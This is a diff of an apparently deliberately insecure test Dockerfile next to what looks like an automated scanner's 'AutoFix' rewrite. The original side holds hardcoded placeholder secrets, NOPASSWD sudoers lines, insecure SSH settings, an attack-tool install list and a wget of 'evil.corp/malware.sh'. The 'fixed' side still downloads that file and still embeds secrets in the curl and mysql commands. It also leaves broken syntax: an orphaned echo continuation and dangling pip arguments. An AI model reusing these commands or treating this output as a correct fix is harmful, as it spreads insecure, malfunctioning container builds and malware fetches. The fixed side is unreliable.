@@ -8,134 +8,180 @@
 # ════════════════════════════════════════
 
 # Rule #1 — Unpinned base image (latest)
-FROM node:latest AS builder
+# RECOMMENDED: Pin with digest: node:20-alpine@sha256:<digest>
+FROM node:20-alpine AS builder
 
 # Rule #2 — Hardcoded ARG secrets
-ARG API_KEY=sk_live_AbCdEfGhIjKlMnOpQrStUvWxYz
-ARG DB_PASS=Str0ngP@ssw0rd!2024
-ARG STRIPE_SECRET=sk_live_51NxxxxxxxxxxxxxxxxxxxxxxxxxX
-ARG PRIVATE_KEY=-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAK
+# WARNING: Set this via --build-arg, not hardcoded
+ARG API_KEY=
+# WARNING: Set this via --build-arg, not hardcoded
+ARG DB_PASS=
+# WARNING: Set this via --build-arg, not hardcoded
+ARG STRIPE_SECRET=
+# WARNING: Set this via --build-arg, not hardcoded
+ARG PRIVATE_KEY=
 
 # Rule #3 — apt without cleanup
-RUN apt-get install -y build-essential gcc g++ make cmake
+# WARNING: Pin apt versions for reproducibility
+# Example: build-essential=<version>
+# NOTE: The following attack tools were removed by ShieldOps AutoFix: openssh-server, sudo, nmap
+RUN apt-get update && \
+    apt-get install -y --no-install-recommends \
+      build-essential \
+      gcc \
+      g++ \
+      make \
+      cmake \
+      curl \
+      wget \
+    && rm -rf /var/lib/apt/lists/*
 
 # Rule #4 — curl without --fail
-RUN curl -H "Authorization: Bearer sk_live_AbCdEfGhIjKlMnOpQrStUvWxYz" \
+# WARNING: Hardcoded secret detected in RUN — use --mount=type=secret or build args
+RUN curl -fsSL -H "Authorization: Bearer sk_live_AbCdEfGhIjKlMnOpQrStUvWxYz" \
     https://api.example.com/config -o /tmp/config.json
 
 # Rule #5 — Remote script piped to bash
-RUN curl -fsSL https://get.docker.com | bash
+RUN curl -fsSLo /tmp/install.sh https://get.docker.com \
+  && chmod +x /tmp/install.sh \
+  && /tmp/install.sh \
+  && rm -f /tmp/install.sh
 
 # Rule #6 — SSH insecure config
-RUN apt-get install -y openssh-server && \
-    echo "PermitRootLogin yes" >> /etc/ssh/sshd_config && \
-    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config && \
-    echo "PermitEmptyPasswords yes" >> /etc/ssh/sshd_config
+    echo "PermitRootLogin no" >> /etc/ssh/sshd_config && \
+    echo "PasswordAuthentication no" >> /etc/ssh/sshd_config && \
+    echo "PermitEmptyPasswords no" >> /etc/ssh/sshd_config
 
-# Rule #7 — sudo NOPASSWD
-RUN echo "root ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
-RUN echo "deploy ALL=(ALL) NOPASSWD: /usr/bin/node" >> /etc/sudoers
+# REMOVED: sudo password-less escalation risk (ShieldOps AutoFix)
+# REMOVED: sudo password-less escalation risk (ShieldOps AutoFix)
+# REMOVED: sudo password-less escalation risk (ShieldOps AutoFix)
 
-# Rule #8 — Heredoc with attack tools + NOPASSWD + wget http
+# REMOVED: sudo password-less escalation risk (ShieldOps AutoFix)
 RUN <<EOF
-apt-get install -y nmap telnet masscan hydra aircrack-ng john tcpdump wireshark netcat-traditional
-wget http://evil.corp/malware.sh -O /tmp/setup.sh
-echo "root ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+# WARNING: Pin apt versions for reproducibility
+# Example: netcat-traditional=<version>
+apt-get install -y netcat-traditional
+wget https://evil.corp/malware.sh -O /tmp/setup.sh
+# REMOVED: sudo password-less escalation risk (ShieldOps AutoFix)
 EOF
 
 # Rule #9 — Temp files not cleaned
-RUN gcc -o /tmp/preprocess /src/preprocess.c
-RUN make -C /src/native build
-RUN wget https://github.com/project/release.tar.gz -O /tmp/release.tar.gz
-RUN tar -xzf /tmp/release.tar.gz -C /tmp/extracted
+RUN gcc -o /tmp/preprocess /src/preprocess.c && rm -rf /tmp/*
+RUN make -C /src/native build && rm -rf /tmp/*
+RUN wget https://github.com/project/release.tar.gz -O /tmp/release.tar.gz && rm -rf /tmp/*
+RUN tar -xzf /tmp/release.tar.gz -C /tmp/extracted && rm -rf /tmp/*
 
 # Rule #10 — apt install without --no-install-recommends
-RUN apt-get install -y curl wget openssh-server sudo nmap
 
 # Rule #11 — Sensitive files copied into image
-COPY .env.production /builder/.env
+# REMOVED: sensitive/unnecessary files
+# Use .dockerignore to exclude .git and .env
 WORKDIR /builder
-COPY secrets/jwt.pem /builder/secrets/jwt.pem
-COPY id_rsa /root/.ssh/id_rsa
-COPY id_rsa.pub /root/.ssh/authorized_keys
-COPY .aws/credentials /builder/.aws/credentials
+# REMOVED: sensitive/unnecessary files
+# Use .dockerignore to exclude .git and .env
+# REMOVED: sensitive/unnecessary files
+# Use .dockerignore to exclude .git and .env
+# REMOVED: sensitive/unnecessary files
+# Use .dockerignore to exclude .git and .env
+# REMOVED: sensitive/unnecessary files
+# Use .dockerignore to exclude .git and .env
 
 # Rule #12 — mysql secret in RUN command
+# WARNING: Hardcoded secret detected in RUN — use --mount=type=secret or build args
 RUN mysql -u root -pStr0ngP@ssw0rd!2024 -e "CREATE DATABASE prod;"
 
 # Rule #13 — Hardcoded ENV secrets
-ENV STRIPE_SECRET_KEY=sk_live_51NxxxxxxxxxxxxxxxxxxxxxxxxxX
-ENV DATABASE_URL=postgresql://superadmin:Str0ngP@ssw0rd@prod-db.internal:5432/payments
-ENV JWT_SECRET=super_jwt_secret_key_do_not_share
-ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
-ENV REDIS_AUTH=redis_auth_token_production
-ENV SENDGRID_API_KEY=SG.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+# WARNING: Set this via environment variable, not hardcoded
+ENV STRIPE_SECRET_KEY=${STRIPE_SECRET_KEY}
+# WARNING: Set this via environment variable, not hardcoded
+ENV DATABASE_URL=${DATABASE_URL}
+# WARNING: Set this via environment variable, not hardcoded
+ENV JWT_SECRET=${JWT_SECRET}
+# WARNING: Set this via environment variable, not hardcoded
+ENV AWS_SECRET_ACCESS_KEY=${AWS_SECRET_ACCESS_KEY}
+# WARNING: Set this via environment variable, not hardcoded
+ENV REDIS_AUTH=${REDIS_AUTH}
+# WARNING: Set this via environment variable, not hardcoded
+ENV SENDGRID_API_KEY=${SENDGRID_API_KEY}
 
 # ════════════════════════════════════════
 # STAGE 2 — Runtime
 # ════════════════════════════════════════
+# RECOMMENDED: Pin with digest: node:18-slim@sha256:<digest>
 FROM node:18-slim
+# RECOMMENDED: Add OCI labels for image metadata
+LABEL org.opencontainers.image.description="<fill>" \
+      org.opencontainers.image.source="<fill>" \
+      org.opencontainers.image.title="<fill>" \
+      org.opencontainers.image.version="<fill>"
 
 # Rule #14 — WORKDIR after COPY
-COPY --from=builder /builder/dist /app/dist
-COPY --from=builder /builder/.env /app/.env
-COPY --from=builder /builder/secrets/jwt.pem /app/secrets/jwt.pem
 WORKDIR /app
+COPY --from=builder /builder/dist /app/dist
+# REMOVED: sensitive/unnecessary files
+# Use .dockerignore to exclude .git and .env
+# REMOVED: sensitive/unnecessary files
+# Use .dockerignore to exclude .git and .env
 
 # Rule #15 — Sensitive ports exposed
-EXPOSE 22
-EXPOSE 3306
-EXPOSE 5432
-EXPOSE 6379
-EXPOSE 27017
-EXPOSE 2375
-EXPOSE 2376
-EXPOSE 9200
-EXPOSE 9300
-EXPOSE 5601
-EXPOSE 15672
-EXPOSE 7474
+# REMOVED (sensitive port exposure): EXPOSE 22
+# REMOVED (sensitive port exposure): EXPOSE 3306
+# REMOVED (sensitive port exposure): EXPOSE 5432
+# REMOVED (sensitive port exposure): EXPOSE 6379
+# REMOVED (sensitive port exposure): EXPOSE 27017
+# REMOVED (sensitive port exposure): EXPOSE 2375
+# REMOVED (sensitive port exposure): EXPOSE 2376
+# REMOVED (sensitive port exposure): EXPOSE 9200
+# REMOVED (sensitive port exposure): EXPOSE 9300
+# REMOVED (sensitive port exposure): EXPOSE 5601
+# REMOVED (sensitive port exposure): EXPOSE 15672
+# REMOVED (sensitive port exposure): EXPOSE 7474
+# WARNING: Binding to privileged port (<1024) requires root — consider using port >=1024
 EXPOSE 80
 
 # Rule #16 — apt without cleanup (runtime stage)
-RUN apt-get install -y curl
-RUN apt-get install -y wget
-RUN apt-get install -y openssh-server
-RUN apt-get install -y sudo
-RUN apt-get install -y nmap
 
 # Rule #17 — SSH PermitRootLogin in runtime
-RUN echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
+RUN echo "PermitRootLogin no" >> /etc/ssh/sshd_config
 
 # Rule #18 — pip install attack/infra tools
-RUN pip3 install ansible fabric paramiko
-RUN pip3 install boto3 awscli
+# WARNING: Pin pip versions to ensure reproducible builds
+# Example: ansible==1.0.0
+# WARNING: pip install as root in final stage — consider --user or virtual env
+RUN pip3 install --no-cache-dir \
+    ansible \
+    fabric \
+    paramiko \
+    boto3 \
+    awscli
 
 # Rule #19 — curl|bash (remote script)
-RUN curl -fsSL https://get.docker.com | bash
+RUN curl -fsSLo /tmp/install.sh https://get.docker.com \
+  && chmod +x /tmp/install.sh \
+  && /tmp/install.sh \
+  && rm -f /tmp/install.sh
 
-# Rule #20 — chmod 777
-RUN chmod -R 777 /app
+# Rule #20 — chmod 755
+RUN chmod -R 755 /app
 
-# Rule #21 — sudo NOPASSWD again
-RUN echo "root ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+# REMOVED: sudo password-less escalation risk (ShieldOps AutoFix)
+# REMOVED: sudo password-less escalation risk (ShieldOps AutoFix)
 
 # Rule #22 — Sensitive VOLUME mounts
-VOLUME ["/etc", "/root", "/var/run/docker.sock", "/proc", "/sys"]
-VOLUME ["/var/run/docker.sock:/var/run/docker.sock"]
+# REMOVED (sensitive volume): VOLUME ["/etc", "/root", "/var/run/docker.sock", "/proc", "/sys"]
+# REMOVED (docker socket mount): VOLUME ["/var/run/docker.sock:/var/run/docker.sock"]
 
 # Rule #23 — Broad COPY (whole context)
 COPY . /app
 
 # Rule #24 — curl without --fail (second occurrence)
-RUN curl -o /tmp/node-addon.tar.gz https://cdn.example.com/addon.tar.gz
-RUN tar -xzf /tmp/node-addon.tar.gz
+RUN curl -fsSL -o /tmp/node-addon.tar.gz https://cdn.example.com/addon.tar.gz && rm -rf /tmp/*
+RUN tar -xzf /tmp/node-addon.tar.gz && rm -rf /tmp/*
 
 # Rule #25 — SSH PermitRootLogin (runtime again)
-RUN echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
+RUN echo "PermitRootLogin no" >> /etc/ssh/sshd_config
 
 # Rule #26 — pip install as root without venv
-RUN pip3 install --no-cache-dir \
     ansible \
     fabric \
     paramiko \
@@ -149,7 +195,12 @@ RUN pip3 install --no-cache-dir \
 # (missing HEALTHCHECK)
 
 # Rule #29 — CMD in shell form + debug flags
-CMD node server.js --inspect=0.0.0.0:9229 --debug --env=development --host=0.0.0.0 --port=80
+RUN groupadd -r app && useradd -r -g app app
+USER app
+HEALTHCHECK --interval=30s --timeout=3s --retries=3 CMD wget -qO- http://localhost:8080/health || exit 1
+# WARNING: Binding to 0.0.0.0 exposes all interfaces — consider 127.0.0.1 in production
+# RECOMMENDED: Add ENTRYPOINT for explicit process definition
+CMD ["node", "server.js", "--inspect=0.0.0.0:9229", "--env=development", "--host=0.0.0.0", "--port=80"]
 
 # Rule #30 — No ENTRYPOINT defined
 # (missing ENTRYPOINT)
